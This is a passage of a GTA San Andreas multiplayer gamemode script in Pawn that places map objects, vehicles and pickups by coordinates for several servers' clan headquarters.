	CreateSObject(972, -4610.2729492188, 1739.8006591797, 79.641304016113, 0, 0, 43.450927734375, 500);
	CreateSObject(972, -4601.9409179688, 1751.5126953125, 79.616149902344, 0, 0, 101.00830078125, 500);
	CreateSObject(972, -4635.7768554688, 1878.4154052734, 79.326156616211, 0, 0, 132.72192382813, 500);
	CreateSObject(972, -4666.8784179688, 1840.7288818359, 79.333923339844, 0, 0, 143.63012695313, 500);
	CreateSObject(972, -4652.1557617188, 1860.767578125, 79.373352050781, 0, 0, 143.62976074219, 500);
	CreateSObject(972, -4659.3173828125, 1869.8084716797, 79.386558532715, 0, 0, 143.62976074219, 500);
	CreateSObject(972, -4658.1499023438, 1862.3977050781, 78.932350158691, 0, 0, 143.62976074219, 500);
	CreateSObject(972, -4639.4545898438, 1887.4719238281, 79.232490539551, 0, 0, 132.72033691406, 500);
	CreateSObject(972, -4577.6474609375, 1756.1721191406, 79.416282653809, 0, 0, 101.00830078125, 500);
	CreateSObject(972, -4572.6674804688, 1763.5549316406, 79.599502563477, 0, 0, 101.00830078125, 500);
	CreateSObject(972, -4682.3681640625, 1647.74609375, 79.507125854492, 0, 0, 139.04577636719, 500);
	CreateSObject(972, -4678.076171875, 1669.515625, 79.107818603516, 0, 0, 182.71276855469, 500);
	CreateSObject(972, -4680.9848632813, 1669.4281005859, 78.866142272949, 0, 0, 166.82824707031, 500);
	CreateSObject(972, -4684.630859375, 1670.1051025391, 78.997695922852, 0, 0, 168.81237792969, 500);
	CreateSObject(972, -4680.4443359375, 1692.3602294922, 78.949554443359, 0, 0, 168.81042480469, 500);
	CreateSObject(972, -4669.8081054688, 1712.6639404297, 79.282539367676, 0, 0, 134.09484863281, 500);
	CreateSObject(972, -4669.1435546875, 1710.5029296875, 79.423561096191, 0, 0, 134.09362792969, 500);
	CreateSObject(972, -4665.0922851563, 1717.6607666016, 79.005577087402, 0, 0, 114.24377441406, 500);
	CreateSObject(972, -4551.5068359375, 1763.0571289063, 79.062408447266, 0, 0, 81.161499023438, 500);
	CreateSObject(972, -4554.1015625, 1756.2115478516, 79.63452911377, 0, 0, 81.156005859375, 500);
	CreateSObject(972, -4533.705078125, 1748.1765136719, 79.305252075195, 0, 0, 53.371520996094, 500);
	CreateSObject(972, -4526.2153320313, 1762.4232177734, 78.684219360352, 0, 0, 95.051086425781, 500);
	CreateSObject(972, -4515.9594726563, 1757.8121337891, 78.587226867676, 0, 0, 162.81805419922, 500);
	CreateSObject(972, -4629.8383789063, 1895.2205810547, 79.093223571777, 0, 0, 201.23706054688, 500);
	CreateSObject(972, -4694.10546875, 1872.8312988281, 79.401382446289, 0, 0, 25.724487304688, 500);
	CreateSObject(972, -4697.798828125, 1871.2918701172, 79.390434265137, 0, 0, 25.724487304688, 500);
	CreateSObject(972, -4711.3247070313, 1902.3984375, 79.6787109375, 0, 0, 47.779357910156, 500);
	CreateSObject(972, -4710.8637695313, 1890.2092285156, 79.334281921387, 0, 0, 47.774047851563, 500);
	CreateSObject(972, -4749.0063476563, 1816.2164306641, 79.616096496582, 0, 0, 8.0742797851563, 500);
	CreateSObject(972, -4734.123046875, 1909.8449707031, 79.66633605957, 0, 0, 300.57995605469, 500);
	CreateSObject(972, -4733.2353515625, 1897.7237548828, 79.17684173584, 0, 0, 300.57495117188, 500);
	CreateSObject(972, -4754.8173828125, 1907.8287353516, 79.661430358887, 0, 0, 258.89025878906, 500);
	CreateSObject(972, -4729.0063476563, 1906.6231689453, 79.63956451416, 0, 0, 294.61706542969, 500);
	CreateSObject(972, -4750.9428710938, 1896.6553955078, 79.172546386719, 0, 0, 294.61486816406, 500);
	CreateSObject(972, -4757.3452148438, 1907.119140625, 79.703323364258, 0, 0, 193.1005859375, 500);
	CreateSObject(972, -4767.0581054688, 1888.1459960938, 79.584266662598, 0, 0, 95.831115722656, 500);
	CreateSObject(972, -4768.23828125, 1885.1865234375, 79.124458312988, 0, 0, 95.817260742188, 500);
	CreateSObject(972, -4788.7778320313, 1883.8215332031, 79.094024658203, 0, 0, 9.7235107421875, 500);
	CreateSObject(972, -4753.7954101563, 1885.1616210938, 79.211776733398, 0, 0, 300.57495117188, 500);
	CreateSObject(972, -4781.8408203125, 1883.359375, 79.34049987793, 0, 0, 276.75109863281, 500);
	CreateSObject(972, -4751.9638671875, 1846.8649902344, 79.330780029297, 0, 0, 29.580688476563, 500);
	CreateSObject(972, -4736.1166992188, 1839.8695068359, 79.611106872559, 0, 0, 316.13623046875, 500);
	CreateSObject(972, -4755.15625, 1863.8729248047, 79.56827545166, 0, 0, 30.558227539063, 500);
	CreateSObject(972, -4748.3720703125, 1826.1604003906, 79.088821411133, 0, 0, 355.8251953125, 500);
	CreateSObject(4866, -4714.9853515625, 1774.9931640625, 79.433097839355, 0, 0, 270.31311035156, 500);
	CreateSObject(4866, -4604.9189453125, 1779.53515625, 79.397720336914, 0, 0, 271.79626464844, 500);
	CreateSObject(4866, -4818.6474609375, 1764.4351806641, 87.578071594238, 0, 0, 270.31311035156, 500);
	CreateSObject(4866, -4580.8017578125, 1788.6779785156, 87.172241210938, 0, 0, 271.79077148438, 500);
	CreateSObject(972, -4526.3305664063, 1758.6627197266, 88.845420837402, 0, 95.280029296875, 95.048217773438, 500);
	CreateSObject(972, -4525.8354492188, 1751.5466308594, 89.013671875, 0, 95.278930664063, 95.048217773438, 500);
	CreateSObject(972, -4547.0659179688, 1757.7064208984, 89.969902038574, 0, 95.278930664063, 95.048217773438, 500);
	CreateSObject(972, -4525.1611328125, 1745.4188232422, 89.425819396973, 0, 95.278930664063, 95.048217773438, 500);
	CreateSObject(972, -4527.4345703125, 1758.6594238281, 82.601379394531, 0, 95.278930664063, 95.048217773438, 500);
	CreateSObject(972, -4526.8134765625, 1751.4826660156, 83.241119384766, 0, 95.278930664063, 95.048217773438, 500);
	CreateSObject(972, -4528.1987304688, 1745.2822265625, 83.312965393066, 0, 95.278930664063, 90.623352050781, 500);
	CreateSObject(972, -4535.984375, 1759.0080566406, 82.581207275391, 0, 95.2734375, 90.620727539063, 500);
	CreateSObject(972, -4543.2661132813, 1751.9669189453, 83.110885620117, 0, 95.278930664063, 5.7235717773438, 500);
	CreateSObject(972, -4547.1416015625, 1751.6845703125, 89.677124023438, 0, 95.2734375, 5.7183837890625, 500);
	CreateSObject(972, -4747.4340820313, 1732.9155273438, 76.525260925293, 0, 0, 217.22131347656, 500);
	CreateSObject(972, -4786.9423828125, 1879.7526855469, 82.656547546387, 0, 91.310028076172, 95.82275390625, 500);
	CreateSObject(4866, -4666.8725585938, 1669.9735107422, 88.06810760498, 0, 0, 180.30126953125, 500);
	CreateSObject(4866, -4799.2211914063, 1816.6556396484, 86.919639587402, 0, 0, 285.73803710938, 500);
	CreateSObject(4866, -4811.2026367188, 1720.5477294922, 87.394706726074, 0, 0, 248.0234375, 500);
	CreateSObject(972, -4696.2573242188, 1739.4561767578, 89.986068725586, 0, 90.575012207031, 210.50354003906, 500);
	CreateSObject(972, -4707.7202148438, 1757.0924072266, 90.036582946777, 0, 90.5712890625, 210.50354003906, 500);
	CreateSObject(972, -4709.6694335938, 1744.0891113281, 90.56810760498, 0, 90.5712890625, 210.50354003906, 500);
	CreateSObject(972, -4706.0224609375, 1745.6962890625, 90.873748779297, 0, 90.5712890625, 210.50354003906, 500);
	CreateSObject(972, -4714.0278320313, 1766.7297363281, 90.026481628418, 0, 90.5712890625, 194.62365722656, 500);
	CreateSObject(972, -4719.912109375, 1790.787109375, 90.094718933105, 0, 90.565795898438, 194.62280273438, 500);
	CreateSObject(972, -4689.234375, 1852.37890625, 90.081039428711, 0, 90.560302734375, 153.47900390625, 500);
	CreateSObject(972, -4697.173828125, 1871.2711181641, 90.008087158203, 0, 90.560302734375, 25.808715820313, 500);
	CreateSObject(972, -4648.3100585938, 1880.7060546875, 79.397720336914, 0, 0, 123.77984619141, 500);
	CreateSObject(972, -4707.712890625, 1893.3525390625, 89.715278625488, 0, 90.554809570313, 30.556884765625, 500);
	CreateSObject(972, -4717.1362304688, 1900.0747070313, 89.848983764648, 0, 90.54931640625, 30.552978515625, 500);
	CreateSObject(972, -4727.9497070313, 1901.494140625, 89.865913391113, 0, 90.54931640625, 121.86251831055, 500);
	CreateSObject(972, -4725.1342773438, 1898.5885009766, 89.618286132813, 0, 90.54931640625, 121.86032104492, 500);
	CreateSObject(972, -4750.1533203125, 1891.6357421875, 89.694725036621, 0, 90.554809570313, 302.4375, 500);
	CreateSObject(972, -4756.8032226563, 1895.849609375, 89.785278320313, 0, 90.54931640625, 302.46716308594, 500);
	CreateSObject(972, -4755.0922851563, 1902.9825439453, 90.656646728516, 0, 90.54931640625, 279.06970214844, 500);
	CreateSObject(972, -4758.306640625, 1905.4431152344, 90.274993896484, 0, 90.54931640625, 279.06921386719, 500);
	CreateSObject(972, -4706.244140625, 1839.4847412109, 90.196624755859, 0, 90.554809570313, 75.431701660156, 500);
	CreateSObject(972, -4689.4951171875, 1839.2032470703, 89.614685058594, 0, 90.54931640625, 11.906799316406, 500);
	CreateSObject(972, -4676.7001953125, 1844.3693847656, 89.629386901855, 0, 90.54931640625, 322.27905273438, 500);
	CreateSObject(972, -4680.6591796875, 1848.5258789063, 89.88304901123, 0, 90.54931640625, 322.27844238281, 500);
	CreateSObject(972, -4662.0639648438, 1862.5947265625, 89.740379333496, 0, 90.54931640625, 322.27844238281, 500);
	CreateSObject(972, -4666.0034179688, 1868.3638916016, 89.718734741211, 0, 90.54931640625, 322.27844238281, 500);
	CreateSObject(972, -4649.3588867188, 1878.9390869141, 89.312271118164, 0, 90.54931640625, 316.32348632813, 500);
	CreateSObject(972, -4655.685546875, 1880.5357666016, 89.733039855957, 0, 90.54931640625, 316.318359375, 500);
	CreateSObject(972, -4661.681640625, 1742.0563964844, 90.190841674805, 0, 90.54931640625, 320.29345703125, 500);
	CreateSObject(972, -4677.3911132813, 1728.3737792969, 90.239967346191, 0, 90.54931640625, 311.03991699219, 500);
	CreateSObject(972, -4659.513671875, 1737.2082519531, 90.198654174805, 0, 90.54931640625, 305.53942871094, 500);
	CreateSObject(972, -4649.5166015625, 1746.1887207031, 90.316833496094, 0, 90.54931640625, 305.53527832031, 500);
	CreateSObject(972, -4648.5185546875, 1741.2203369141, 90.335678100586, 0, 90.54931640625, 305.53527832031, 500);
	CreateSObject(972, -4709.8173828125, 1892.2213134766, 89.817291259766, 0, 90.54931640625, 30.552978515625, 500);
	CreateSObject(972, -4715.9833984375, 1815.4470214844, 79.325614929199, 0, 0, 169.75134277344, 500);
	CreateSObject(972, -4766.1171875, 1862.7790527344, 79.433097839355, 0, 0, 58.102416992188, 500);
	CreateSObject(972, -4779.9243164063, 1878.0992431641, 79.83268737793, 0, 0, 16.416381835938, 500);
	CreateSObject(972, -4702.8393554688, 1892.1970214844, 79.433097839355, 0, 0, 19.724487304688, 500);
	CreateSObject(972, -4686.0473632813, 1863.7731933594, 89.48356628418, 0, 90.560302734375, 195.16357421875, 500);
	CreateSObject(972, -4646.7998046875, 1762.1068115234, 79.397720336914, 0, 0, 170.78601074219, 500);
	CreateVehicleEx(425,-4717.0781,1872.6909,81.0052,114.7257,0,0); //
	CreateVehicleEx(520,-4678.4146,1757.4237,81.1563,69.4335,0,0); //
	CreateVehicleEx(520,-4670.7729,1794.4272,81.1563,244.8336,0,0); //
	// Cars (StreeTBoy+Zryex):
	CreateSObject(9123, -2887.9855957031, 467.83029174805, 9.4637632369995, 0, 0, 358.25, 500);
	CreateSObject(9121, -2988.0925292969, 492.43914794922, -38.249996185303, 0, 0, 179.41540527344, 500);
	CreateSObject(3872, -2916.4111328125, 468.63745117188, 9.8540458679199, 0, 0, 0, 500);
	CreateSObject(3080, -2904.7241210938, 412.96887207031, 4.5066256523132, 0, 0, 0, 500);
	CreateSObject(3080, -2904.7783203125, 419.39270019531, 4.5141725540161, 0, 0, 180.57580566406, 500);
	CreateSObject(13594, -2904.2182617188, 401.10943603516, 13.68115234375, 0, 0, 0, 500);
	CreateSObject(1225, -2904.1123046875, 401.08837890625, 18.038539886475, 0, 0, 0, 500);
	CreateSObject(2780, -2904.7048339844, 415.99673461914, 2.7226152420044, 0, 0, 0, 500);
	CreateSObject(3461, -2864.791015625, 416.22937011719, 5.6320333480835, 0, 0, 0, 500);
	CreateSObject(3461, -2852.3239746094, 510.28356933594, 5.6320486068726, 0, 0, 0, 500);
	CreateSObject(3877, -2996.9499511719, 486.75784301758, 6.7965450286865, 0, 0, 0, 500);
	CreateSObject(3877, -2996.9580078125, 455.22677612305, 6.8661818504333, 0, 0, 0, 500);
	CreateSObject(3877, -2978.8979492188, 486.95010375977, 6.9045653343201, 0, 0, 0, 500);
	CreateSObject(3877, -2973.0317382813, 486.96984863281, 6.968120098114, 0, 0, 0, 500);
	CreateSObject(3877, -2950.3833007813, 486.97613525391, 6.8884000778198, 0, 0, 0, 500);
	CreateSObject(3877, -2931.5979003906, 454.41720581055, 6.9883065223694, 0, 0, 0, 500);
	CreateSObject(3877, -2944.8493652344, 487.08120727539, 6.9295024871826, 0, 0, 0, 500);
	CreateSObject(3877, -2928.0573730469, 416.53259277344, 6.7977595329285, 0, 0, 0, 500);
	CreateSObject(3877, -2852.3579101563, 510.40521240234, 3.6464614868164, 0, 0, 0, 500);
	CreateSObject(3877, -2865.0278320313, 416.39825439453, 3.5716242790222, 0, 0, 0, 500);
	CreateSObject(3877, -2931.4812011719, 487.24111938477, 6.8954272270203, 0, 0, 0, 500);
	CreateSObject(3877, -2931.1511230469, 510.09906005859, 6.8392152786255, 0, 0, 0, 500);
	CreateSObject(6865, -2859.427734375, 467.24981689453, 9.2685270309448, 0, 0, 132.94573974609, 500);
	CreateSObject(3872, -2904.1672363281, 400.63949584961, 16.55948638916, 0, 298.46496582031, 278.61560058594, 500);
	CreateSObject(13667, -2863.3742675781, 465.58898925781, 30.752700805664, 0, 0, 190.6455078125, 500);
	CreateSObject(970, -2975.9460449219, 507.27154541016, 1.9811685085297, 0, 0, 0, 500);
	CreateSObject(970, -2947.7509765625, 507.20916748047, 1.9811685085297, 0, 0, 0, 500);
	CreateSObject(3877, -2945.1665039063, 507.32037353516, 1.1500046253204, 0, 0, 0, 500);
	CreateSObject(3877, -2949.9809570313, 507.17855834961, 0.98820185661316, 0, 0, 0, 500);
	CreateSObject(3877, -2973.6396484375, 507.20791625977, 1.2394587993622, 0, 0, 0, 500);
	CreateSObject(3877, -2978.3312988281, 507.05688476563, 1.2786362171173, 0, 0, 0, 500);
	CreateSObject(3749, -2862.1616210938, 467.14056396484, 9.2109727859497, 0, 0, 268.69067382813, 500);
	CreateSObject(8229, -2855.3276367188, 499.75085449219, 6.5734553337097, 0, 0, 253.54577636719, 500);
	CreateSObject(8229, -2859.55078125, 484.17568969727, 6.5701785087585, 0, 0, 74.647155761719, 500);
	CreateSObject(8229, -2864.1450195313, 427.35470581055, 6.7582521438599, 0, 0, 87.2763671875, 500);
	CreateSObject(8229, -2863.2221679688, 446.91860961914, 6.762882232666, 0, 0, 266.2607421875, 500);
	CreateSObject(3268, -2878.904053, 500.256470, 3.914063, 0.0000, 0.0000, 90.0000, 500);
	CreateSObject(3268, -2916.181396, 500.010437, 3.914063, 0.0000, 0.0000, 90.0000, 500);
	CreateSObject(6295, -2980.090576, 472.273926, 27.521456, 0.0000, 0.0000, 270.0000, 500);
	CreateSObject(9958, -3003.366699, 476.676544, 7.224641, 0.0000, 0.0000, 0.0000, 500);
	CreateSObject(17068, -2968.373291, 442.283142, 0.463852, 0.0000, 0.0000, 270.0000, 500);
	CreateSObject(17068, -2987.509521, 442.271576, 0.474621, 0.0000, 0.0000, 270.0000, 500);
	CreateVehicleEx(411,-2923.6279,506.7195,4.6411,181.2791,6,0); //
	CreateVehicleEx(411,-2928.6558,506.8050,4.6411,180.6478,1,0); //
	CreateVehicleEx(451,-2919.0142,506.7569,4.6210,178.5163,1,0); //
	CreateVehicleEx(451,-2914.5161,506.6694,4.6209,180.4676,6,1); //
	CreateVehicleEx(541,-2909.7349,507.0993,4.5391,181.3665,1,0); //
	CreateVehicleEx(541,-2905.1602,507.1166,4.5389,181.4544,6,0); //
	CreateVehicleEx(545,-2890.8804,506.9853,4.7252,180.9201,1,0); //
	CreateVehicleEx(545,-2887.3872,507.2608,4.7252,179.8253,6,0); //
	CreateVehicleEx(506,-2882.9832,507.0978,4.6185,179.6690,1,0); //
	CreateVehicleEx(506,-2878.2751,506.9538,4.6185,180.8644,6,0); //
	CreateVehicleEx(434,-2872.9294,507.2404,4.8771,179.2444,0,0); //
	CreateVehicleEx(434,-2867.5427,507.4254,4.8828,181.4216,0,0); //
	CreateVehicleEx(513,-2968.7627,472.2064,5.4589,269.4329,83,1); //
	CreateVehicleEx(437,-2991.1907,459.8696,5.0474,269.6428,6,0); //
	CreateVehicleEx(409,-2992.6099,481.3322,4.7140,269.3305,1,0); //
	CreateVehicleEx(446,-2981.3374,493.5146,-0.0271,0.1199,0,0); //
	CreateVehicleEx(522,-2866.7178,491.6921,4.4784,92.2334,6,0); //
	CreateVehicleEx(522,-2891.0518,491.7559,4.4765,270.3104,1,0); //
	CreateVehicleEx(522,-2903.5081,491.1702,4.4826,89.6533,2,0); //
	CreateVehicleEx(522,-2927.7666,491.1396,4.4614,269.8795,3,0); //
	CreateVehicleEx(417,-2980.8833,432.2238,-0.5539,88.8445,0,0); //
	CreateVehicleEx(446,-2942.4089,493.7299,-1.0666,357.9854,0,0); //
	CreateVehicleEx(484,-2955.7708,495.2994,0.0420,356.8382,0,1); //
	CreateVehicleEx(595,-2966.4412,494.5636,-0.1615,359.0473,2,0); //
	CreateVehicleEx(571,-2897.9207,490.9383,4.1904,180.0478,6,1); //
	CreateVehicleEx(571,-2897.8147,495.2409,4.1904,179.4533,3,0); //
	CreateVehicleEx(571,-2897.7747,499.4364,4.1939,179.0667,2,0); //
	CreateVehicleEx(495,-2891.8342,413.3964,4.8973,181.0697,6,1); //
	CreateVehicleEx(495,-2916.6697,413.3509,4.1350,178.4312,8,0); //
	// Clans:
		// gmR R=10 G=80 B=250
	loadClans = "gmR";
	CreateSObject_HQ(3749, 2666.739990, -2504.185791, 18.354694, 0.0000, 0.0000, 90.0000);
	CreateSObject_HQ(8210, 2666.459229, -2537.997559, 15.734488, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(8263, 2666.911133, -2435.214355, 15.485769, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(13749, 2757.245117, -2506.710449, 17.937181, 0.0000, 0.0000, 142.7350);
	CreateSObject_HQ(2669, 2736.357178, -2462.146973, 13.888731, 0.0000, 0.0000, 180.0000,1,2736.357178, -2462.146973, 26.213726); //Move Object 1
	CreateSObject_HQ(16645, 2730.296387, -2458.495361, 24.923615, 0.0000, 0.0000, 180.0000);
	CreateSObject_HQ(8149, 2731.336426, -2565.037842, 15.708824, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(1632, 2677.102783, -2402.556152, 13.517443, 8.5944, 0.0000, 90.0000);
	CreateSObject_HQ(1632, 2671.704590, -2402.535156, 17.754177, 22.3454, 0.0000, 90.0000);
	CreateSObject_HQ(1506, 2749.359131, -2451.813721, 12.812461, 0.0000, 0.0000, 180.0000,1,2750.730713, -2451.813721, 12.812461); //Move Object 2
	CreateSObject_HQ(980, 2666.746094, -2504.216553, 15.296949, 0.0000, 0.0000, 90.0000,1,2666.746094, -2504.216553, 20.846960); //Move Object 3
	CreateSObject_HQ(980, 2803.447021, -2439.827393, 10.931273, 269.7591, 359.1406, 359.1406,1,2815.031982, -2439.827393, 10.931273); //Move Object 4
	CreateSObject_HQ(8148, 2666.888916, -2411.416748, 15.330416, 0.0000, 0.0000, 180.0000);
	CreateSObject_HQ(987, 2687.331787, -2330.485596, 12.632813, 0.0000, 0.0000, 180.0000);
	CreateSObject_HQ(987, 2678.291504, -2330.559082, 12.607813, 0.0000, 0.0000, 180.0000);
	CreateSObject_HQ(3749, 2696.205322, -2332.313721, 18.491222, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(8209, 2755.692871, -2331.063965, 15.733843, 0.0000, 0.0000, 180.0000);
	CreateSObject_HQ(980, 2696.212891, -2331.160645, 15.406204, 0.0000, 0.0000, 0.0000,1,2696.212891, -2331.160645, 9.806206); //MoveObject 5
	CreateSObject_HQ(7392, 2693.361328, -2519.135498, 34.257442, 0.0000, 0.0000, 123.7499);
	CreateSObject_HQ(3279, 2671.241943, -2489.185303, 12.725622, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(3279, 2672.895508, -2415.836670, 12.708429, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(16644, 2696.934082, -2496.945068, 24.919735, 0.0000, 0.0000, 90.0000);
	CreateSObject_HQ(16644, 2696.872314, -2514.387451, 24.918171, 0.0000, 0.0000, 90.0000);
	CreateSObject_HQ(16644, 2697.673096, -2407.932373, 24.934374, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(16644, 2697.738281, -2390.510742, 24.941328, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(14780, 2744.849609, -2465.753174, 13.490236, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(7909, 2696.338379, -2453.125732, 19.173063, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(13831, 2699.314209, -2452.721680, 32.484802, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(14637, 2664.710449, -2504.018555, 14.418549, 0.0000, 0.0000, 180.0000);
	CreateSObject_HQ(9241, 2792.363525, -2537.454590, 11.836494, 0.0000, 0.0000, 270.0002);
	CreateVehicleEx(522,2745.2429,-2449.6714,13.2204,358.7325,7,0);
	CreateVehicleEx(463,2743.8767,-2449.8862,13.1978,4.2490,7,0);
	CreateVehicleEx(510,2770.9150,-2393.5120,13.2417,178.2774,7,0);
	CreateVehicleEx(481,2770.6838,-2389.0859,15.8317,177.7578,7,0);
	CreateVehicleEx(541,2778.4304,-2463.8538,13.2591,2.1428,7,0);
	CreateVehicleEx(451,2779.3789,-2487.8562,13.3662,181.3810,7,0);
	CreateVehicleEx(470,2797.8003,-2494.3835,13.6342,91.7232,0,0);
	CreateVehicleEx(511,2749.3250,-2532.2524,29.9751,90.8076,7,0);
	CreateVehicleEx(462,2686.9473,-2512.5972,12.8624,358.0935,7,0);
	CreateVehicleEx(513,2763.5232,-2384.8696,14.1769,179.5942,7,0);
	CreateVehicleEx(493,2695.4492,-2311.6311,-0.1408,271.3579,7,0);
	CreateVehicleEx(446,2719.5996,-2311.7170,-0.4217,272.1262,7,0);
	CreateVehicleEx(487,2718.8713,-2463.4417,28.7640,1.1201,0,7);
	CreateVehicleEx(487,2792.4919,-2536.1497,13.8388,135.6850,7,0);
	CreateVehicleEx(411,2779.0347,-2410.3206,13.3409,179.2372,7,0);
	CreateVehicleEx(534,2778.9895,-2448.0100,13.3781,178.8115,7,0);
	CreateVehicleEx(451,2779.1465,-2498.2112,13.3679,1.7270,7,0); // turis
	CreateVehicleEx(409,2797.0720,-2455.8560,13.4312,92.1150,7,0); // stretch
	CreateVehicleEx(429,2778.4749,-2425.4895,13.3180,1.0398,7,0); // banshee
	CreateVehicleEx(571,2751.8015,-2453.8604,12.9269,1.4979,7,0); // kart
	CreateVehicleEx(506,2788.1936,-2501.0132,13.3541,0.4023,7,0); // supergt
	CreateVehicleEx(437,2758.6226,-2520.0005,13.7739,1.6592,7,0); // bus
	CreatePickupEx(1242,2,2742.7437,-2454.0525,13.8623);
	CreatePickupEx(1240,2,2743.4563,-2454.0798,13.8623);
	CreatePickupEx(356,2,2744.2859,-2454.1113,13.8623);
	CreatePickupEx(341,2,2744.9758,-2453.9802,13.8623);
	CreatePickupEx(342,2,2745.9834,-2453.9878,13.8623);
	CreatePickupEx(363,2,2793.0359,-2393.8582,13.9560); // satchel
	CreatePickupEx(358,2,2797.2332,-2393.8599,13.9560); // sniper
	CreatePickupEx(325,2,2799.2527,-2393.9626,13.9560); // flowers
	dbg(11,"6a");
		// Hyper
	loadClans = "Hyper";
	CreateVehicleEx(451,-673.8000,957.6930,11.9000,89.000,3,0); // Turismo_1
	CreateVehicleEx(451,-687.8000,957.6930,11.9000,89.000,3,0); // Turismo_2
	CreateVehicleEx(522,-674.9929,934.5065,11.8415,202.7762,0,3); // NRG_1
	CreateVehicleEx(522,-672.2299,934.7040,11.7005,207.8889,0,3); // NRG_2
	CreateVehicleEx(487,-558.5422,811.0610,4.5032,51.4346,0,3); // Maverick_1
	CreateVehicleEx(487,-568.4259,799.0183,4.4235,51.4346,0,3); // Maverick_2
	CreateVehicleEx(539,-614.0828,852.1802,5.6000,225.000,3,0); // Vortex
	CreateVehicleEx(541,-680.8000,957.6930,11.9000,89.000,0,3); // Bullet
	CreateVehicleEx(490,-677.2485,962.7361,12.2614,89.6696,0,3); // FBI_1
	CreateVehicleEx(490,-677.2113,969.1786,12.2616,89.6696,0,3); // FBI_2
	CreateVehicleEx(593,-719.9077,983.8345,12.5929,178.2264,3,0); // Dodo
	CreateVehicleEx(446,-632.5745,851.8372,-0.5101,225.7289,0,3); // Boat_1
	CreateVehicleEx(446,-646.2200,865.1422,-0.2714,225.7289,0,3); // Boat_2
	CreateVehicleEx(545,-701.5933,945.6818,12.1700,320.0,3,0); //  Idanshit
	CreateVehicleEx(579,-692.0538,924.1339,12.300,88.000,3,0); // AAvivBPrO
	CreateSObject_HQ(8493, -603.280823, 840.905273, 17.656858, 0.0000, 0.0000, 225.8594,1,-603.280823, 840.905273, -57.368141);
	CreateSObject_HQ(3279, -691.612183, 976.314148, 11.076170, 0.0000, 0.0000, 180.0002);
	CreateSObject_HQ(18267, -526.389404, 909.776306, 3.707801, 0.0000, 5.1136, 169.6094);
	CreateSObject_HQ(4876, -534.779297, 929.952820, -5.878939, 358.8398, 1.7189, 21.3314);
	CreateSObject_HQ(11495, -631.448792, 856.431885, 0.792182, 0.0000, 0.0000, 47.6556);
	CreateSObject_HQ(619, -537.851990, 898.616760, 0.801301, 0.0000, 0.0000, 202.5000);
	CreateSObject_HQ(621, -533.297852, 924.803833, 0.758947, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(3279, -700.700012, 931.149292, 11.410780, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(3276, -726.486572, 962.022156, 12.025576, 0.0000, 0.4297, 87.1641);
	CreateSObject_HQ(3276, -726.716736, 985.045837, 12.300047, 0.0000, 0.0000, 90.0000);
	CreateSObject_HQ(3276, -720.960938, 991.321960, 12.039671, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(8613, -684.607605, 948.085876, 15.454245, 0.0000, 0.0000, 180.0000,1,-684.607605, 948.085876, 32.029221);
	CreateSObject_HQ(6865, -530.148621, 910.829590, 7.939823, 352.2651, 10.3132, 305.4689);
	CreateSObject_HQ(16663, -653.609802, 939.916626, 15.360937, 0.0000, 0.0000, 313.4101,1,-653.609802, 939.916626, 59.761040);
	CreateSObject_HQ(1607, -544.078613, 938.797913, 2.671374, 41.2530, 40.3935, 343.5161);
	CreateSObject_HQ(1607, -545.670227, 941.925964, 2.573012, 32.6586, 47.2690, 342.6566);
	CreateSObject_HQ(6295, -661.371704, 939.584961, 34.687214, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(8615, -620.905579, 846.732117, 3.647226, 0.0000, 0.0000, 316.7189);
	CreateSObject_HQ(3280, -617.599243, 845.414612, 5.360037, 0.0000, 0.0000, 316.0313);
	CreateSObject_HQ(3280, -616.497986, 846.563965, 5.364719, 0.0000, 0.0000, 225.8595);
	CreateSObject_HQ(4874, -578.196899, 815.236511, 3.858550, 0.0000, 0.0000, 140.6293);
	CreateSObject_HQ(11544, -604.584839, 837.925354, 5.223544, 0.0000, 0.0000, 321.0934);
	CreateSObject_HQ(3461, -534.833984, 919.494629, 2.680790, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(3461, -538.639282, 900.534302, 2.280646, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(3502, -665.323853, 854.604248, 2.426668, 0.8594, 10.3132, 112.5776);
	CreateSObject_HQ(9831, -660.952759, 856.160217, -0.173051, 5.2603, 6.0161, 297.5793);
	CreateSObject_HQ(974, -686.348572, 941.146484, 35.471153, 88.5220, 0.0000, 0.0000);
	CreateSObject_HQ(974, -686.358826, 935.644226, 35.628731, 88.5220, 0.0000, 0.0000);
	CreatePickupEx(353,2,-668.7400,937.4417,18.000);//MP5
	CreatePickupEx(351,2,-668.7400,941.6464,18.000);//Combet
	CreatePickupEx(1241,2,-686.2366,939.9604,37.00);//Drug
	CreatePickupEx(1240,2,-687.900,935.2000,37.00);//Life
	CreatePickupEx(1242,2,-684.600,935.2000,37.00);//Armour
		// LoL
	loadClans = "LoL";
	CreateSObject_HQ(8152, -2136.281982, -788.593140, 29.874132, 2.5783, 356.5623, 89.1405);
	CreateSObject_HQ(8149, -2164.555420, -787.968689, 41.731350, 358.2811, 0.0000, 0.0000);
	CreateSObject_HQ(8149, -2165.011230, -937.349731, 35.773464, 6.0161, 0.0000, 0.0000);
	CreateSObject_HQ(8152, -2085.117676, -981.067627, 34.504131, 0.8594, 0.0000, 180.0000);
	CreateSObject_HQ(8147, -1937.960938, -1010.424194, 32.394669, 0.0000, 0.0000, 270.0000);
	CreateSObject_HQ(8147, -1865.409302, -937.495972, 32.998905, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(8147, -1865.435181, -791.248230, 32.983307, 0.0000, 0.0000, 0.0000);
	CreateSObject_HQ(8263, -1921.288086, -710.553833, 34.272903, 0.0000, 0.0000, 358.2811);
	CreateSObject_HQ(3749, -1987.737793, -709.367798, 36.544430, 0.0000, 0.0000, 0.0000);
